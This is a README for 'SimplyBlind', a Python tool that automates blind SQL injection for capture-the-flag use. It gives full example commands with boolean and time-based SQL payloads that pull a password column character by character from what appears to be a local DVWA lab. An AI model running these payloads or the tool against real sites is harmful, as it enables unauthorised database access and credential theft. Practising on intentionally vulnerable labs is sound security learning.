# SimplyBlind  
A script to extracted characters by exploiting blind SQL injection.

Designed for Capture The Flags (CTF) as I felt it was too troublesome to manual extract each character. This is not meant for illegal use. Please do not run this script on sites you do not have permissions on.

## Quick Start Guide:    
There are 2 "attack" modes:
- Brute: Brute force every character in the table
- Quick: Quick attack narrows down possible CHAR before checking it. Making it faster than brute

Modes are set with `-m <mode>`:  
- sc   Status Code 
- reg   regex  
- redir   redirect    
- to | nto  timeout | not_timeout  

The mode identifies if the injection returned a TRUE or FALSE.

## Examples:
Response Status code
``` shell
python simplyBlind.py quick -p "1' AND BINARY SUBSTR(password, \!I, 1) \!S '\!C' #" -c '{"PHPSESSID":"etc7stehjcs7c4kqaa6p6kit03", "security":"low"}' --get http://localhost/vulnerabilities/sqli_blind/
```
![200](img/200.gif)
``` shell
python simplyBlind.py quick -m sc -s 200 -p "1' AND BINARY SUBSTR(password, \!I, 1) \!S '\!C' #" -c '{"PHPSESSID":"etc7stehjcs7c4kqaa6p6kit03", "security":"low"}' --get http://localhost/vulnerabilities/sqli_blind/
```
![200_2](img/200_2.gif)  

Regex:
``` shell
python simplyBlind.py quick --m reg --regex "User ID exists in the database" -p "2' AND BINARY SUBSTR(password, \!I, 1) \!S '\!C' #" -c '{"PHPSESSID":"etc7stehjcs7c4kqaa6p6kit03", "security":"low"}' --get http://localhost/vulnerabilities/sqli_blind/
```
![regex](img/regex.gif)  

Timeout:
```shell
python simplyBlind.py quick -m to --timeout 0.5 -p "10' AND IF(BINARY SUBSTR(password, \!I, 1) \!S '\!C', SLEEP(0.7), FALSE) #" -c '{"PHPSESSID":"etc7stehjcs7c4kqaa6p6kit03", "security":"low"}' --get http://localhost/vulnerabilities/sqli_blind/
```
![timeout](img/time.gif)


### Common Parameter:
`-p <payload>`   takes in a string to set custom payload. The payload takes in keys that will be replaced with the appropriate value. Keys, !I = increment, !S = symbol, !C = Char. Increments will run from 1 to the end of character in database, or till it's the same value as --limit. The symbol is used to narrow down and determine if the targeted character is the character we want. Character will be the character we are trying to match with.    

`-b <body>`   Takes in a string that sets the custom body. Body takes the key !P that will be replaced with the payload.  

`--get`   Set method to GET. Default is POST.

`-h`   For help menu
